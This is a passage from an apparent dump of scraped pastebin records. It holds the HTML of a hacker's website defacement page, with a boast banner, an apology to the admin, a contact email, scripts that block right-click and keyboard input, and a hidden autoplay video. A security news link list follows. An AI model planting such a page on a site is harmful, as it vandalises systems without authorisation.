nJ99eq6ZL+hg851GCVZMAxdndPHf3a1jvo5WTXaSxse2SjlAyTnQ7gJOu8hf2h1rxG7UCslq1hxLrlbph94i6G6MNqrJMyVGuU6T0SOrfwM1pxgzZyU39z2+t\/wCr\/sptchcB22scVXQ9J23idMoAJU9kKPtAnRlIDUoZ5Im9jOCtKKS62Lhohyplg0dQXUT3kqdeAy6HNIyXVSUYNxe6NdrCMppSXIZtHDFekDK+6tVl1KNdaZbS\/Uz3nT3ReqPpC9l4oooIAIKgFWGZWB3qw4jd5AjUTWqrRjWjpkZ6NxUt5qdN4ZbYcQGfDnSJuYV2JDqNSbbD9ZABI3OInWuFWtKtrLXT4PXW\/VLbqcPAuliT2Uvn\/PwLjYDK+Li2pCXsCnRJB051LbAnQGAD5Vn1a6jk+6LK9J29hGGcuFVrP4ZKHZGzLd1boe6bdy3qZXOhWQrHTUQTqddDPA1RSo+I3FcnZv8AqDtVGppzB\/3TLbPeGU32tZbNi5atZHRzc5xDbBhWJiCCSQNF66221vVlVjlbI891G+slb1FRbcqjTfy\/n4k2Iss93GJbGZytiFG85cmYgdlNaTjG5blwVdShOXTKCis8\/qQ\/pjXMXZt58ypdtswEFOe6AulSN\/Sk9UluustaSlWxHjOx1rag6Vg51Fibjj8N8fz6BeKZLjc0cObs2bbjmlRbqkgOSXykwQYgzvrVG8q0qr07\/I4sOk0K9pGpNqLbxlmfxeGTIty2SbbEr0gA6MsEo8aHQggjeOAiu7Y3quE3w0ed6r0udjU0PdPh+5X3bROoHz31vycvdDbV7gY8agbAWMBbNs3brMEzZFVCoZmgEklpAVQy6wT0q5fUr\/7vhJZbO30TpM76bw8JFFtrZlq5As3GDadC7l6RPBbiwJ7GAHbXKj1ONXaawduv0Orbx1RepfIyWLwpRxmUghirAiCOBBB3VTUxlpGSK2RAljpoP3\/ci\/nVL4LMboNw4m5cPUSB7vxpXwWJbtk+0NbWH\/i9+Y1EXuyZcIbaAa3lPGTPUT\/4+Yqe6DlEmyrYhsw3KSO8Dd6VqtmoVGpd0yisnKCcfcfduybL8cuU\/atNBHky+VYNOMo1p5wzT4LS1lH128mMg+RFd3pk\/wCkcm\/hmZFi16InfNNex\/p5EtJLXsBbOvZGuFmKjTUcJnXwMHcd247jzbf14RtuPRku8Wq3NQVS6pDBohSbcKZjeBmAIkwHVgSCJ2RTXJie4n6Nf\/yrn\/8ASf8AtqMBqZjr94u0sSTAEnqAj57STxrbpwtinOSbB4XOTrCiJJMb5gDtME9gVjwpXLBMY5Zo8LhyZO4LpwElejl64EW1bdBs21GYqxrBX9DRsoPFRMtbRBQTqCNa4WpxllHd0qSwyLZiYdXy384tkEKU3qZENHEQGEa7x3j11CpVnbxlDnueVr06ca8oy4LVNhtnY4a4LoTIysDlMmWGUgxK5dZK6ndup3dRccVVjJSreSlmm8k6bVR3m6vNX1QWhdE5OjdFzp21HRMiMwmDrFY6\/Tv+dN\/6OnadXaj4VX05z+OMclqwtol9wARZxecxGtnEhQw7VKXD\/KK5qzBt90ztyzX0QfE6ePxjn9vzKTGbPtc69q3eAZWZcl2LbGNOjc9hp7SvdXXpdTg\/LU2ODW6FcxpqtTWqL32G7SvKSVxWGOeBLKTauGBEmZRwQIkL40sunUq3mpyHteu3Vn5HwuzCrGNHN2LiWSLdjEMWS2rXGC5bb5maJJJDmTA0jhWG8t\/AlFI63TLuV8q2uSUpLCy0l9CBNqC8+JTDTcYW7HNwCrMLJtq0KddD0o6l7KW0qQ+8Nvhr\/A3VrGtQ6dSyt03nG\/L+QY+Mt5NoXUAPNXgbZgMouMXt5o3GC0+AqiFVwU3BmqpZePO1hWWdstfJbg+JwVzoJccXXuWmdXCqjh0trca02X9YpRhDbweya22V1UozjGbzF\/kcrqdjbXVKpVoQ0ShLGFw0+H9SpxuxnBIEMykKwQ52RiJCuBqDoezQiZFdyle0araT49zzVbp9xQjGc4vEuBMLhWxGHNhf1tq5nCyFLLcVVcDMRJU20MdRNcnrNvKeJx3PSfZfqNO1qShV2TGcqWYi2cSjdJSrSuW5ae3lDFZHSUqytkOmrARE1ghRVanvtJGupdSs7hqlLMHut87GQ2yhJyMQzKBDzOZY6OvFcuUgnhp2DPDKellt7GnNKpTWMlXhVm4s9ZPuHuppcHPjyewgi1mO987ebED3HzqJc4GhxkM2mf8A5ez33PTJ\/wBwpY+pjS9JBs5tUBPFZ7tQfvVMuGxY8pFps8Kt4qRIadPUjymmqzbxImEMZiBXreQ3EOptX571bSR2EQ3lVbll59xlHCwbbYWzzdtTPsnKeJO6Pnsq23v1bxxjJXXtfGfOCHlJhltuoGbKsBzvhmML6Hd2jrpvvtS4eZiK0hRj5eSgu2+lcH7o+BPfU0H\/AFkFZf0huA2jl6LjMvDiQYKxrvXKSsdRO8Sp68qb5RylL3Cs9j65\/wCP\/wC5S6ZexOYlIiZjEgb9SYUACSSeAABJPZVzeFkrSy8Ghs2crIi6ZDAkGcywzOw4ZOi7Di5tWphDWVt8svS7Eu0L+QiyhyhEUuZnm06OnWXaQO3PrOYZK9OYtseLxJJB1l+jFefktz0MHlAmJbWvW9KebdHluqR\/rsIwuNZCDbdkbrUwfHrFdGVOM1iSyc5VJRflY3nTMkzrJ7Z406j2E1PkuLGNtumV7z2iUFu5lUOLttDmUGSMrrundEVxbvp851HKnwz0fTetQoUlCpHU45cX7MbjsThcTdNxw9hi05h9LbMQBnX2lMACVkdlV1+kSSzF5Zq6d9p5Uo+FJZj\/AGx\/PmJtG7icMA4yXsMTBGl6xJ0042j\/ACma5rlXtpd0eho0um9WhpeNX9n+zIlxuHYytx8K+ntZrlo6cHXpp4g99dCl1aL2rRycO7+ydxDzW8s\/LuSbRtMyK+ILuFJFvFWWW7o37DGRmEzEsrCSIPB6trRunqoSSfsZ7Hql10typXEMp9pBGxWw9q21ouz4XFLlzsAht37RkBokJKlWBJPCdAY51S3dvLw59ztq+qdRirqgl4lN+ld4v9e+SwwWNH6WiFxdGHsuQ4CwALR0OUkFhopIJGlJHeoop5wLdQ0WE62nRre6\/nb2KobPxSvjbtm6EC3biOJ6bKzMxjTqHfvqrTPMmmdR3NpKNCjVhltJp9s4SHYzAm8tm87wow4526QW1W7cUDLMu5CgAdQ7K7Vnexo2uZbvJ4zqfTZ1+pSpUY4\/mSr2hiLDFVyXbigEjnbsDcT0UtgZASu7Md1c6r1OUm9MUju0Ps3oSVSp37GQxWIl0YgBVOUgTAWCsDw7azxbk22V3VONKKprsAXDkZz9Vbh9\/wCAp3vg5\/GSbEaWwCdQoXxBAPuY0j9TGXpJr5zYO23EXGHmu\/8A4QqF62S94IA2fbLNb72nwgj4U7kopiRi20aHmenm4wG84+I9ayqbaNelZyPx1lXAuKf1ic23XKwUb+UgfwiiMt8MWSyabkPfYoyqJJCnXcNIk9nZVVeKyPB7FxtjALzcEZpzFid7Eg5ie33aRuFWWs\/PgS4jmOTGJZDPeB0HRUnqGZFY+Clj3A10bb4mTFcPEEjPXFKkq2jKSCOojQ12k8o5LWHgTN21OCC1weHCQVOZujBADAsTKBR+0sgEa9MpOltSzZ5SzyWqOC4gWEP7d1\/o1Ua669GdC3TYuz6SxO6ABQszfyHxp+oBsewLrEk5kV89xtIvXYJUDrtrJPUZJ3E5HqS0rH8REFktQu\/sJrz9VYkz0NP0IrMZcr0PR6i0OJwusU8TUxcNc00rurc4ctie5O8d+lOinJHzvXvqcEvdD7lzcBRpXLDW35Yi2toXLU822saA9JT+6ynRkO4g+8A1TVoRqxaktjTRrulJOEmmg5LOGxSB1Iw1wjUdJ7BP37X9QHZXn7ro8saqe57Tp32snTei5WV79\/8Av9fmDP8ApGCYQShYSGUhrd1ew6pcXs1rjvxKL9meui7PqdLtJfmv8oO2bte22aFt2neA9pwThL0bjvmxcEmDOXtWuhTv4V1ouP7nmbz7P3FjLxrFtr27r9y1wF4Zytuxbw+ItGRbYtF1XUqyE3GgyDI1ggmOE6K9mqcVUovKObb9WlXnKjet6Xt9H7hWybN1BdXEKUfE3CArQGM2r4LRwGa4gntrJQozlCcmjb1O8oKtQjRlnT\/1+xT3cYf0HDIT0ecvHxBWB\/W381YpPFNI70KKd9VkucR\/Nf8AQTsxhbe0qpNy7ZuXZUqrkxc5q2jMCFkKeGpcdVbbego0fFSyzz\/VLqVW68CUtMU0s+3uznvKhyXYE3QwuOSl6A6zE7gASSx\/ZHXS61LtgzVrd0ntJSXuiquwZ6mCIf4mUH40i5K36SXFmY7TPvPwpETIIb\/CBepQ\/jn6XoT4VGfOMl5CHY9slsvbv7wBPr6UtbZE0dzUQDbZhvAjwWYNZlyauwLsk5rTKTGqkHvBj3Gmls8iLg1HJN8l8rEA6DuIn3ikqb7kxNRtWwzLCqWJ0gCd\/WeG+kpKTlsE5RS8zOf2sE3NsSp\/WNzgjVVg27gjiQrsf\/19oruW23Jybl5ewDylw7TnKwQz5tNwZg\/iA91knsXgyz0KU0jHOLZRTV+tFWGa1bi2VNxt6ySwIYy4A6JPtORl6XVkgBJC8\/Lm8I0vCRV8zcusVIi66hSok8xZIACa\/wCkYELB1gmYznLdmKXyX5le7LR3Cqlm2QoCNJ3ZFnpMW\/ZLZGIPAy5jIap58zLeNgvCoIgRAAiAQIjSAdQOyuHWfnZ3qPoRX7TwxGtarG58Kpkz3tv4tNorcLfgweJ869fComso8nUptbB16\/G41r+Zj+QLfudtRwNsya1qm+COFEXlkyWIrBEzHdEd9T9Qj8gfZmN5u6yHcdR476qW0sF845hkt12g9gFdLlhjLWXGa3rxA3q3apB7apubOlXj5lv7ltj1CtbTTpyaaG3sAlxTdw0soEvZJzXLQ4kf5tv94CR+0BvryN906pbvK3R9N6P9o6d2lCt5Z\/k\/2YzBbVhVt3V5y0PZExctg7+acgwD9QgqeqdaptOoVbeWz29jT1b7P29+nL0z91\/n9y2sjIVxGHfnEVgxYKA9pgRlF23JyiRE6qevWK9VbXtG6i48Z7HzTqPSrrp9Tzr6Psyd9o2L1s2HtLYBcuLilii3CAAcmuW2QIIB6iBpFYrnpC0PQzp2H2jq07iM6u+2l\/NfuuwHi1CIlrFq6FRFq8gW6joSWAjMA6gkkMrT0oI0rn2l7O0zCpHY7t\/0in1WX3i0qLL5Xz\/n+zE8oLylwqsXClgHYZWIMRIkwBuGvlSyqqrJzSwjmzt5W0fDm90AZoVT9a4vfoJ99IuSiXpJcQeko4DU\/wAKsaVe40uQnZNwEW1bcc6N\/Gp\/Cq6m241N5wgjBSjKOOUemg+eyicW46h4NKWk1GOw3N2DH1PeY84jyrInuaXwU6plQx1oPJoPxp+WJjY0mHuFbtm4P2soPlP3pFVy4YyWxvLhJWVYieI04g+WgquM5QeYsiUIyWGjFbX5Q37d29buvntKUBlVzpzkNIgdJegDIIIIA6jXoaEfEpxkuTi11om0M2u5ds11wwOVWIAACaWi4gAQGuCZ35+oQbIJ8FcmVX9xYj\/Isf8ApD8as8RfMXSDbf8A1Cf7w3379LS5l9AqdvqEbE\/xGL\/3kf8ANv0VfTEIcshfdf8AtYb7uBqfb6fuMXI\/Wv3n31wK\/qZ3qHoQm1PYNV0+SyfBkbu9e\/417K0+FE8rdfEkF3N1dNHNkRP7I7qkUlwW4\/PGphyhanoFxXteFSLEp8V+uWqJ+tGyn8Nmkvfq\/Cr1wYf+YvIn\/HYb7Y9zVz734Mjp23xEBYn23+033jXhJ+pn22h8KP0X6F1yI\/xFz\/dr\/wBytdh8dHB+1P8A4D+qKofPnXu5cHyNeo33Jj\/6Zc\/2zV5zqXxGel6P6kci5S+2ft\/A1gp+k33\/AMZlXe9i39v4GiPLM0\/SgrG+14N\/yzSx4GfI\/Zu9f9ov3WpavcaiWn\/3I+2f+Y1E\/hfgEfimt5RfqvBffWCHJvfBRj9U32l++afuVouE\/Vp9pfvClfcZcHQcL7C9wqkDnPLL\/EYr\/YWv+bar0vTvhR+pxb74r+iGYj\/DH\/dh9xauj6\/xM8vT+BvKzlh\/\/9k=);     background-repeat: no-repeat;      background-attachment: fixed;      background-position: top;     background-color:#000000;     position: relative;     background-size:100% 90vh;          }    .logo {     width: 500px;     height: 200px;     margin: 0 auto;     margin-top: 50px;     -webkit-filter: drop-shadow(0px 0px 7px #0080FF);     filter: drop-shadow(0px 0px 7px #0080FF);    }    .logo:hover{     width: 300px;     height: 300px;     -webkit-filter: drop-shadow(0px 0px 10px #0080FF);     opacity:0.4;     filter:alpha(opacity=40);     transition: opacity .2s ease-out;     -moz-transition: opacity .2s ease-out;     -webkit-transition: opacity .2s ease-out;     -o-transition: opacity .2s ease-out;    }    .defacedby{     font-family: Megrim;     text-align: center;     color: black;     font-weight: bold;     font-size: 50px;   text-shadow: #0080FF 1px 2px 1px;        }    .glow {     font-family: Quicksand;     text-align: center;     color: grey;     font-style: bold;     font-size: 15px;    margin-top: 16px;    text-shadow: black 1px 2px 1px;        }    .greetings{     font-family: Quicksand;     text-align: center;     color: #ffffff;     font-size: 15px;     margin-top: 50px; text-shadow: black 1px 2px 1px;    }    <\/style>   <\/head>    <body>   <script>    alert('Parker'z Gans Was Here!')   <\/script>   <meta name=\"title\" content=\"Kenangan ada untuku dikenang, bukan dilupakan\"> <meta name=\"description\" content=\"Let it go ~\"> <meta name=\"keywords\" content=\"Hacked  \"> <meta name=\"googlebot\" content=\"index,follow\" \/> <meta name=\"robots\" content=\"all\" \/> <meta name=\"robots schedule\" content=\"auto\" \/> <meta name=\"distribution\" content=\"global\" \/> <base target='_blank'\/> <link href='https:\/\/fonts.googleapis.com\/css?family=Dancing+Script' rel='stylesheet' type='text\/css'> <link href=\"https:\/\/fonts.googleapis.com\/css?family=Shadows+Into+Light+Two\" rel=\"stylesheet\" type='text\/css'> <font face=\"'Covered By Your Grace', Arial, sans-serif;\" size=\"5px\" color=\"#8B0000\"><br<br>><span style=\"color: white;\"><div align=\"center\"><br><br><br><br><br><br><br><br><font face=\"verdana\" size=\"5px\" color=\"cyan\" style=\"text-shadow: lime 0 0 10px;\">-=[: Touched By Parkerz Gans :]=- <\/font><span style=\"color: white;\"><div align=\"center\"><font face=\"Jolly Lodger\" size=\"3px\" color=\"white\" style=\"Jolly Lodger\">\"We Are Onanimous We Donlot Bokep:v We Tonton Bokep:v Mantap euy!:v\" <\/font><\/br> <span style=\"color: white;\"><div align=\"center\"> <font face=\"Shadows Into Light Two\" size=\"2px\" color=\"white\" style=\"text-shadow: lime 0 0 10px;\"><br>Hi Admin:* Forgive Me for Changing the <br>Look of Your Website:\"( I am from Indonesia  <br>AI am handsome:v If you want to go back as before you can<br>contact me via Gmail I am below: ')<br>phreakerz404@gmail.com <\/br><\/font> <br><font color='white' face='verdana' size='3'>-=|<\/font> <font face=\"Shadows Into Light Two\" size=\"3px\" color=\"cyan\" style=\"text-shadow: grey 0 0 10px;\"> <marquee scrollamount='6' behavior='alternate' width='50%'> TERMUX TUTORIAL INDONESIA-SUNDA CYBER ARMY-ALL DEFACER INDONESIA-AND YOU!<\/marquee><\/font> <font color='white' face='verdana' size='3'>|=-<\/font> <body bgcolor=black> <body oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;'> <script type='text\/javascript'> var snowmax=35 var snowcolor=new Array(\"#AAAACC\",\"#DDDDFF\",\"#CCCCDD\",\"#F3F3F3\",\"#F0FFFF\") var snowtype=new Array(\"Arial Lime\",\"Arial Narrow\",\"Times\",\"Comic Sans MS\") var snowletter=\"*\" var sinkspeed=0.6 var snowmaxsize=22 var snowminsize=8 var snowingzone=1 \/\/ Do not edit below this line var snow=new Array() var marginbottom var marginright var timer var i_snow=0 var x_mv=new Array(); var crds=new Array(); var lftrght=new Array(); var browserinfos=navigator.userAgent var ie5=document.all&&document.getElementById&&!browserinfos.match(\/Opera\/) var ns6=document.getElementById&&!document.all var opera=browserinfos.match(\/Opera\/) var browserok=ie5||ns6||opera function randommaker(range) { rand=Math.floor(range*Math.random()) return rand } function initsnow() { if (ie5 || opera) { marginbottom = document.body.clientHeight marginright = document.body.clientWidth } else if (ns6) { marginbottom = window.innerHeight marginright = window.innerWidth } var snowsizerange=snowmaxsize-snowminsize for (i=0;i<=snowmax;i++) { crds[i] = 0; lftrght[i] = Math.random()*15; x_mv[i] = 0.03 + Math.random()\/10; snow[i]=document.getElementById(\"s\"+i) snow[i].style.fontFamily=snowtype[randommaker(snowtype.length)] snow[i].size=randommaker(snowsizerange)+snowminsize snow[i].style.fontSize=snow[i].size snow[i].style.color=snowcolor[randommaker(snowcolor.length)] snow[i].sink=sinkspeed*snow[i].size\/5 if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)} if (snowingzone==2) {snow[i].posx=randommaker(marginright\/2-snow[i].size)} if (snowingzone==3) {snow[i].posx=randommaker(marginright\/2-snow[i].size)+marginright\/4} if (snowingzone==4) {snow[i].posx=randommaker(marginright\/2-snow[i].size)+marginright\/2} snow[i].posy=randommaker(2*marginbottom-marginbottom-2*snow[i].size) snow[i].style.left=snow[i].posx snow[i].style.top=snow[i].posy } movesnow() } function movesnow() { for (i=0;i<=snowmax;i++) { crds[i] += x_mv[i]; snow[i].posy+=snow[i].sink snow[i].style.left=snow[i].posx+lftrght[i]*Math.sin(crds[i]); snow[i].style.top=snow[i].posy if (snow[i].posy>=marginbottom-2*snow[i].size || parseInt(snow[i].style.left)>(marginright-3*lftrght[i])){ if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)} if (snowingzone==2) {snow[i].posx=randommaker(marginright\/2-snow[i].size)} if (snowingzone==3) {snow[i].posx=randommaker(marginright\/2-snow[i].size)+marginright\/4} if (snowingzone==4) {snow[i].posx=randommaker(marginright\/2-snow[i].size)+marginright\/2} snow[i].posy=0 } } var timer=setTimeout(\"movesnow()\",50) } for (i=0;i<=snowmax;i++) { document.write(\"<span id='s\"+i+\"' style='position:absolute;top:-\"+snowmaxsize+\"'>\"+snowletter+\"<\/span>\") } if (browserok) { window.onload=initsnow } <\/script> <embed src=\"http:\/\/www.youtube.com\/v\/7w-Xsv8xIc4&amp;autoplay=1&amp;loop=1&amp;playlist=7w-Xsv8xIc4\" type=\"application\/x-shockwave-flash\" wmode=\"transparent\" height=\"1\" width=\"1\"><\/embed> �<\/BODY><\/HTML>�","domain":["youtube.com","googleapis.com","1e100.net"],"host":["par21s04-in-f174","par21s07-in-f14","par10s28-in-x04","par10s21-in-f206","par10s22-in-f14","par10s33-in-f14","wn-in-x5d","par10s22-in-f238","par10s21-in-f14","ams15s29-in-f100","par10s34-in-f14","ams16s29-in-f10","ams15s29-in-f4","par10s27-in-f14","par21s05-in-f142","ham02s14-in-f206","par21s04-in-f14","par10s29-in-f238","par10s27-in-f206","par21s05-in-x0a","par10s29-in-f14","par21s03-in-f142","fra02s18-in-f14","fonts","par21s06-in-f238","par21s03-in-f14","par21s12-in-f14","par21s17-in-x0e","par10s38-in-f14","ams16s29-in-f42","www","par21s06-in-f14","par21s11-in-f14","par21s05-in-f14"],"hostname":["par21s06-in-f238.1e100.net","fonts.googleapis.com","par21s17-in-x0e.1e100.net","par10s38-in-f14.1e100.net","par10s33-in-f14.1e100.net","ams15s29-in-f4.1e100.net","par21s04-in-f174.1e100.net","ams15s29-in-f100.1e100.net","wn-in-x5d.1e100.net","ham02s14-in-f206.1e100.net","par10s34-in-f14.1e100.net","par10s22-in-f238.1e100.net","par10s22-in-f14.1e100.net","par10s21-in-f206.1e100.net","ams16s29-in-f10.1e100.net","par21s03-in-f142.1e100.net","par21s04-in-f14.1e100.net","par21s11-in-f14.1e100.net","par10s29-in-f238.1e100.net","par10s21-in-f14.1e100.net","ams16s29-in-f42.1e100.net","par10s27-in-f206.1e100.net","par21s05-in-f142.1e100.net","www.youtube.com","par10s27-in-f14.1e100.net","par10s28-in-x04.1e100.net","par21s12-in-f14.1e100.net","fra02s18-in-f14.1e100.net","par21s05-in-x0a.1e100.net","par21s03-in-f14.1e100.net","par10s29-in-f14.1e100.net","par21s06-in-f14.1e100.net","par21s05-in-f14.1e100.net","par21s07-in-f14.1e100.net"],"ip":["2a00:1450:400c:c02:0:0:0:5d","216.58.208.206","216.58.204.238","2a00:1450:4007:80a:0:0:0:2004","216.58.213.142","216.58.204.142","216.58.208.238","2a00:1450:4007:808:0:0:0:200e","172.217.19.238","2a00:1450:4007:812:0:0:0:200a","216.58.201.238","172.217.22.142","216.58.213.174","172.217.17.42","216.58.209.238","216.58.206.238","172.217.18.206","216.58.205.14","172.217.17.100","216.58.198.206"],"key":"Y3Fmm6rt","scheme":["http","https"],"seen_date":"2018-11-16","size":"24340","source":"pastebin","syntax":"text","title":"Kerz","tld":["com","net"],"url":["https:\/\/fonts.googleapis.com\/css?family=Shadows+Into+Light+Two","http:\/\/www.youtube.com\/v\/7w-Xsv8xIc4&amp;autoplay=1&amp;loop=1&amp;playlist=7w-Xsv8xIc4","https:\/\/fonts.googleapis.com\/css?family=Dancing+Script"]},{"@category":"pastries","@timestamp":"2018-11-16T23:02:11.000Z","@type":"doc","content":"# ISSession News 2018-11-16\r\n\r\n## Magecart\r\n\r\n<https:\/\/www.zdnet.com\/article\/one-in-five-magecart-infected-stores-get-reinfected-within-days\/>\r\n\r\n<https:\/\/www.bleepingcomputer.com\/news\/security\/infowars-store-affected-by-magecart-credit-card-stealing-hack\/>\r\n\r\n## Faking Biometrics\r\n\r\n<https:\/\/motherboard.vice.com\/en_us\/article\/bjenyd\/researchers-created-fake-master-fingerprints-to-unlock-smartphones>\r\n\r\n## US Chip Cards\r\n\r\n<https:\/\/threatpost.com\/u-s-chip-cards-are-being-compromised-in-the-millions\/139028\/>\r\n\r\n## WSJ Deepfake Detection Training\r\n\r\n<http:\/\/www.niemanlab.org\/2018\/11\/how-the-wall-street-journal-is-preparing-its-journalists-to-detect-deepfakes\/>\r\n\r\n## Calling Alexa to the Stand\r\n\r\n<https:\/\/nakedsecurity.sophos.com\/2018\/11\/16\/judge-asks-if-alexa-is-witness-to-a-double-murder\/>\r\n\r\n## More Chip Attacks\r\n\r\n<https:\/\/arstechnica.com\/gadgets\/2018\/11\/spectre-meltdown-researchers-unveil-7-more-speculative-execution-attacks\/>\r\n\r\n## Autopwn is back!\r\n\r\n<https:\/\/github.com\/DanMcInerney\/msf-autoshell>\r\n\r\n## Leaky SMS Database\r\n\r\n<https:\/\/techcrunch.com\/2018\/11\/15\/millions-sms-text-messages-leaked-two-factor-codes\/>\r\n\r\n## Hacking CPAP Machines\r\n\r\n<https:\/\/motherboard.vice.com\/en_us\/article\/xwjd4w\/im-possibly-alive-because-it-exists-why-sleep-apnea-patients-rely-on-a-cpap-machine-hacker>\r\n\r\n## Japanese Cybersecurity Minister\r\n\r\n<https:\/\/www.nytimes.com\/2018\/11\/15\/world\/asia\/japan-cybersecurity-yoshitaka-sakurada.html>\r\n\r\n## Facebook Expose\r\n\r\n<https:\/\/www.nytimes.com\/2018\/11\/14\/technology\/facebook-data-russia-election-racism.html>\r\n\r\n## Google BGP Hack\r\n\r\n<https:\/\/arstechnica.com\/information-technology\/2018\/11\/major-bgp-mishap-takes-down-google-as-traffic-improperly-travels-to-china\/>\r\n\r\n## WordPress GDPR Compliance Plugin\r\n\r\n<https:\/\/www.scmagazine.com\/home\/security-news\/attackers-exploit-gdpr-compliance-plug-in-for-wordpress\/>\r\n\r\n## North Korea Hacking Crypto Exchanges\r\n\r\n<https:\/\/www.ccn.com\/north-korea-hacked-crypto-exchanges-and-ran-icos-to-fund-regime-report\/>\r\n\r\n## SSD Encryption Issues\r\n\r\n<https:\/\/www.scmagazine.com\/home\/security-news\/encryption-flaws-in-solid-state-drives-enable-unauthorized-data-access\/>\r\n\r\n## University Cryptojacking Shuts Down Network\r\n\r\n<https:\/\/www.zdnet.com\/article\/university-shuts-down-network-to-thwart-cryptojacking-attack\/>\r\n\r\n## Blackberry Buying Cylance\r\n\r\n<https:\/\/techcrunch.com\/2018\/11\/16\/blackberry-continues-its-cybersecurity-push\/>\r\n\r\n## Chipping Employees\r\n\r\n<https:\/\/www.businessinsider.com\/biohax-uk-businesses-microchip-implants-employees-2018-11>\r\n\r\n## Pwn2Own\r\n\r\n<http:\/\/www.eweek.com\/security\/apple-iphone-hacked-at-mobile-pwn2own-2018>\r\n\r\n## VirtualBox 0Day\r\n\r\n<https:\/\/thehackernews.com\/2018\/11\/virtualbox-zero-day-exploit.html>\r\n\r\n## Big Steam Bug Bounty Paid\r\n\r\n<https:\/\/techraptor.net\/content\/20000-bounty-steam-cd-key-bug>","domain":["vice.com","threatpost.com","github.com","eweek.com","wordpress.com","bleepingcomputer.com","niemanlab.org","sophos.com","nytimes.com","amazonaws.com","ccn.com","scnet.net","scmagazine.com","thehackernews.com","businessinsider.com","arstechnica.com","akamaitechnologies.com","zdnet.com","cbsig.net","techraptor.net","techcrunch.com"],"host":["ec2-52-206-170-190","ge-11-2-1","ec2-54-174-214-170","ec2-107-23-119-184","ec2-34-193-124-187","a95-101-2-40","nakedsecurity","ec2-35-173-160-135","www","a92-122-203-105","motherboard","a95-101-2-25","operations-shared-redirect-vip1","ec2-52-2-177-237","ec2-52-21-28-29","ec2-34-225-40-45"],"hostname":["www.nytimes.com","www.eweek.com","ec2-34-193-124-187.compute-1.amazonaws.com","www.scmagazine.com","www.niemanlab.org","motherboard.vice.com","ec2-107-23-119-184.compute-1.amazonaws.com","nakedsecurity.sophos.com","www.ccn.com","ec2-52-206-170-190.compute-1.amazonaws.com","ec2-34-225-40-45.compute-1.amazonaws.com","ec2-35-173-160-135.compute-1.amazonaws.com","operations-shared-redirect-vip1.phx2.cbsig.net","wordpress.com","niemanlab.org","ec2-54-174-214-170.compute-1.amazonaws.com","ge-11-2-1.ar10.ord6.us.scnet.net","a92-122-203-105.deploy.static.akamaitechnologies.com","www.bleepingcomputer.com","a95-101-2-40.deploy.static.akamaitechnologies.com","ec2-52-21-28-29.compute-1.amazonaws.com","ec2-52-2-177-237.compute-1.amazonaws.com","a95-101-2-25.deploy.static.akamaitechnologies.com","www.businessinsider.com","www.zdnet.com"],"ip":["151.101.65.164","151.101.193.164","95.101.2.25","2606:4700:20:0:0:0:6818:1f31","151.101.129.164","104.20.91.106","140.82.118.3","34.225.40.45","151.101.1.164","64.30.228.118","34.193.124.187","104.24.31.49","35.173.160.135","2606:4700:20:0:0:0:6819:926e","151.101.121.171","151.101.65.171","50.31.169.131","192.0.79.33","192.0.66.2","92.122.203.105","2606:4700:20:0:0:0:6819:916e","95.101.2.40","70.42.22.116","192.0.79.32","107.23.119.184","104.24.30.49","104.20.60.209","2606:4700:10:0:0:0:6814:5b6a","2606:4700:10:0:0:0:6814:5a6a","2606:4700:20:0:0:0:6818:1e31","104.20.90.106","216.92.13.127","104.25.145.110","52.2.177.237","52.21.28.29","31.222.175.174","104.25.146.110","151.101.37.132","54.174.214.170","151.101.129.171","52.206.170.190","151.101.1.171","140.82.118.4","104.20.59.209","151.101.193.171"],"key":"t8fjYzSa","scheme":["http","https"],"seen_date":"2018-11-16","size":"2816","source":"pastebin","subdomains":["deploy.static.akamaitechnologies.com","static.akamaitechnologies.com","us.scnet.net","phx2.cbsig.net","ord6.us.scnet.net","ar10.ord6.us.scnet.net","compute-1.amazonaws.com"],"syntax":"markdown","title":"ISSessions News 2018-11-16","tld":["com","org","net"],"url":["https:\/\/www.zdnet.com\/article\/one-in-five-magecart-infected-stores-get-reinfected-within-days\/","https:\/\/www.zdnet.com\/article\/university-shuts-down-network-to-thwart-cryptojacking-attack\/","https:\/\/techcrunch.com\/2018\/11\/15\/millions-sms-text-messages-leaked-two-factor-codes\/","https:\/\/arstechnica.com\/information-technology\/2018\/11\/major-bgp-mishap-takes-down-google-as-traffic-improperly-travels-to-china\/","https:\/\/thehackernews.com\/2018\/11\/virtualbox-zero-day-exploit.html","https:\/\/motherboard.vice.com\/en_us\/article\/bjenyd\/researchers-created-fake-master-fingerprints-to-unlock-smartphones","https:\/\/www.nytimes.com\/2018\/11\/14\/technology\/facebook-data-russia-election-racism.html","http:\/\/www.eweek.com\/security\/apple-iphone-hacked-at-mobile-pwn2own-2018","https:\/\/arstechnica.com\/gadgets\/2018\/11\/spectre-meltdown-researchers-unveil-7-more-speculative-execution-attacks\/","https:\/\/www.nytimes.com\/2018\/11\/15\/world\/asia\/japan-cybersecurity-yoshitaka-sakurada.html","https:\/\/www.bleepingcomputer.com\/news\/security\/infowars-store-affected-by-magecart-credit-card-stealing-hack\/","https:\/\/nakedsecurity.sophos.com\/2018\/11\/16\/judge-asks-if-alexa-is-witness-to-a-double-murder\/","https:\/\/github.com\/DanMcInerney\/msf-autoshell","https:\/\/www.businessinsider.com\/biohax-uk-businesses-microchip-implants-employees-2018-11","https:\/\/techraptor.net\/content\/20000-bounty-steam-cd-key-bug","https:\/\/www.ccn.com\/north-korea-hacked-crypto-exchanges-and-ran-icos-to-fund-regime-report\/","https:\/\/techcrunch.com\/2018\/11\/16\/blackberry-continues-its-cybersecurity-push\/","http:\/\/www.niemanlab.org\/2018\/11\/how-the-wall-street-journal-is-preparing-its-journalists-to-detect-deepfakes\/","https:\/\/www.scmagazine.com\/home\/security-news\/attackers-exploit-gdpr-compliance-plug-in-for-wordpress\/","https:\/\/motherboard.vice.com\/en_us\/article\/xwjd4w\/im-possibly-alive-because-it-exists-why-sleep-apnea-patients-rely-on-a-cpap-machine-hacker","https:\/\/threatpost.com\/u-s-chip-cards-are-being-compromised-in-the-millions\/139028\/","https:\/\/www.scmagazine.com\/home\/security-news\/encryption-flaws-in-solid-state-drives-enable-unauthorized-data-access\/"]},{"@category":"pastries","@timestamp":"2018-11-16T22:55:13.000Z","@type":"doc","content":"<html xmlns=\"http:\/\/www.w3.org\/1999\/xhtml\">\r\n   <link rel='shortcut icon' 